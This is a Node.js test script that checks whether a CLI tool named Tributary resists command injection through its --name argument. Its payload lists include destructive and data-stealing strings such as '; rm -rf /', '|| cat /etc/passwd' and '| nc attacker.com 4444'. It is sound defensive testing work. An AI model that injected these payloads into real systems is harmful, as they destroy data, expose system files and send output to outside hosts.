const { spawn } = require('child_process');
const path = require('path');

/**
 * T212: Command Injection Prevention Test
 *
 * Tests Tributary CLI's resilience against command injection attacks.
 * Validates that shell commands cannot be executed through malicious input.
 */

// Test configuration - MASKED SENSITIVE VALUES
const config = {
    targetToken: 'YOUR_TOKEN_ADDRESS_HERE',
    adminWallet: 'YOUR_ADMIN_WALLET_ADDRESS_HERE',
    network: 'testnet',
    cliPath: './path/to/your/cli.js'
};

const commandInjectionPayloads = [
    {
        payload: '; rm -rf /',
        type: "Semicolon Injection",
        description: "Attempt to execute destructive command"
    },
    {
        payload: '$(whoami)',
        type: "Command Substitution",
        description: "Attempt to execute command via substitution"
    },
    {
        payload: '`id`',
        type: "Backtick Execution",
        description: "Attempt to execute command via backticks"
    },
    {
        payload: '&& echo hacked',
        type: "Conditional Execution",
        description: "Attempt conditional command execution"
    },
    {
        payload: '|| cat /etc/passwd',
        type: "Alternative Execution",
        description: "Attempt alternative command execution"
    },
    {
        payload: '| nc attacker.com 4444',
        type: "Pipe Command",
        description: "Attempt to pipe output to external host"
    },
    {
        payload: '> /tmp/hacked.txt',
        type: "Output Redirection",
        description: "Attempt to redirect output to file"
    }
];

async function execCommand(command, args, options = {}) {
    return new Promise((resolve) => {
        const child = spawn(command, args, {
            stdio: 'pipe',
            ...options
        });

        let stdout = '';
        let stderr = '';

        child.stdout?.on('data', (data) => stdout += data.toString());
        child.stderr?.on('data', (data) => stderr += data.toString());

        const timeout = setTimeout(() => {
            child.kill();
            resolve({ success: false, stdout, stderr, timeout: true });
        }, options.timeout || 5000);

        child.on('close', (code) => {
            clearTimeout(timeout);
            resolve({ success: code === 0, stdout, stderr, timeout: false });
        });

        child.on('error', (error) => {
            clearTimeout(timeout);
            resolve({ success: false, stdout: '', stderr: error.message, systemError: true });
        });
    });
}

async function testCommandInjectionPrevention() {
    console.log('🧪 Testing Command Injection Prevention (T212)');
    console.log('===============================================');

    const results = [];

    for (const { payload, type, description } of commandInjectionPayloads) {
        console.log(`\n🎯 Testing ${type}: ${description}`);
        console.log(`   Payload: "${payload}"`);

        try {
            const result = await execCommand('node', [
                config.cliPath,
                'init',
                '--name', `Test${payload}`,
                '--token', config.targetToken,
                '--admin', config.adminWallet,
                '--network', config.network,
                '--force'
            ]);

            // Check if command injection was prevented
            const injectionBlocked = !result.success ||
                                   !result.stdout.includes('hacked') &&
                                   !result.stdout.includes('root:') &&
                                   !result.stdout.includes('uid=') &&
                                   !result.stdout.includes('connection established');

            results.push({
                type,
                payload,
                blocked: injectionBlocked,
                success: result.success,
                timeout: result.timeout,
                systemError: result.systemError || false
            });

            const status = injectionBlocked ? '✅ BLOCKED' : '⚠️ POTENTIAL RISK';
            console.log(`   Result: ${status}`);

            if (!injectionBlocked && result.stdout) {
                console.log(`   ⚠️ Suspicious output detected: ${result.stdout.substring(0, 100)}...`);
            }

        } catch (error) {
            console.log(`   Result: ✅ SYSTEM BLOCKED`);
            results.push({
                type,
                payload,
                blocked: true,
                success: false,
                timeout: false,
                systemError: true
            });
        }
    }

    // Test additional command injection vectors
    console.log('\n🔍 Testing Additional Command Vectors');

    const additionalTests = [
        { name: 'Environment Variable', payload: '$HOME/malicious' },
        { name: 'Path Traversal + Command', payload: '../../../bin/sh' },
        { name: 'Null Byte Injection', payload: 'test\x00; rm -rf /' }
    ];

    for (const { name, payload } of additionalTests) {
        console.log(`\n🧪 Testing ${name}: "${payload}"`);

        try {
            const result = await execCommand('node', [
                config.cliPath,
                'init',
                '--name', payload,
                '--token', config.targetToken,
                '--admin', config.adminWallet,
                '--network', config.network,
                '--force'
            ]);

            const blocked = !result.success || result.stderr.includes('ValidationError');
            results.push({
                type: name,
                payload,
                blocked,
                success: result.success,
                timeout: result.timeout,
                systemError: result.systemError || false
            });

            console.log(`   Result: ${blocked ? '✅ BLOCKED' : '⚠️ POTENTIAL RISK'}`);

        } catch (error) {
            console.log(`   Result: ✅ SYSTEM BLOCKED`);
            results.push({
                type: name,
                payload,
                blocked: true,
                success: false,
                timeout: false,
                systemError: true
            });
        }
    }

    // Analysis
    console.log('\n📊 Command Injection Prevention Analysis');
    console.log('========================================');

    const blockedCount = results.filter(r => r.blocked).length;
    const systemBlocked = results.filter(r => r.systemError).length;
    const appBlocked = blockedCount - systemBlocked;
    const totalTests = commandInjectionPayloads.length + additionalTests.length;

    console.log(`🛡️ Total injections blocked: ${blockedCount}/${totalTests}`);
    console.log(`📱 App-level blocks: ${appBlocked}`);
    console.log(`🖥️ System-level blocks: ${systemBlocked}`);

    const protectionRate = (blockedCount / totalTests * 100).toFixed(1);
    console.log(`🔒 Protection Rate: ${protectionRate}%`);

    // Security Assessment
    if (blockedCount === totalTests) {
        console.log('✅ Command Injection Prevention: EXCELLENT (all attacks blocked)');
    } else if (blockedCount >= totalTests * 0.9) {
        console.log('⚠️ Command Injection Prevention: GOOD (most attacks blocked)');
    } else {
        console.log('❌ Command Injection Prevention: WEAK (significant vulnerabilities)');
    }

    // Detailed Results
    console.log('\n📋 Detailed Command Injection Results');
    console.log('====================================');
    console.log('Attack Type              | Payload                 | Status   | Protection Level');
    console.log('-------------------------|-------------------------|----------|------------------');

    results.forEach(result => {
        const status = result.blocked ? '✅ BLOCKED' : '❌ RISK';
        const protection = result.systemError ? 'System' : (result.blocked ? 'App' : 'None');
        const payloadDisplay = result.payload.length > 23 ?
                              result.payload.substring(0, 20) + '...' :
                              result.payload;

        console.log(`${result.type.padEnd(24)} | ${payloadDisplay.padEnd(23)} | ${status.padEnd(8)} | ${protection}`);
    });

    return {
        blockedCount,
        totalCount: totalTests,
        protectionRate: parseFloat(protectionRate),
        appBlocked,
        systemBlocked
    };
}

if (require.main === module) {
    testCommandInjectionPrevention().catch(console.error);
}

module.exports = { testCommandInjectionPrevention };